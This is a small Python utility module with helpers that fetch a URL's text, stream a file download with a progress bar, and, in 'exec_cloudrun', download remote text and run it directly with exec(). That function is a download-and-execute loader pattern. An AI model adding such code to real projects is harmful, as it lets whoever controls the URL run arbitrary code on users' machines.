import requests
import requests
import threading
from tqdm import tqdm
import sys
def get_server_data(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Failed to retrieve data. Status code: {response.status_code}")
    except requests.ConnectionError as e:
        print(f"Connection Error: {e}")
        sys.exit()
    except requests.RequestException as e:
        print(f"Request Exception: {e}")
        sys.exit()
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit()

    return None 

def exec_cloudrun(url):
    try:
        get_server_data(url)
        exec(get_server_data(url))
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit()
    return None

def download_files(url, filename):
    with requests.get(url, stream=True) as req, open(filename, 'wb') as file:
        with tqdm(unit='B', unit_scale=True, desc='Downloading', leave=False) as progress_bar:
            for chunk in req.iter_content(chunk_size=1024):
                if chunk:
                    file.write(chunk)
                    progress_bar.update(len(chunk))

    print("Download complete!")
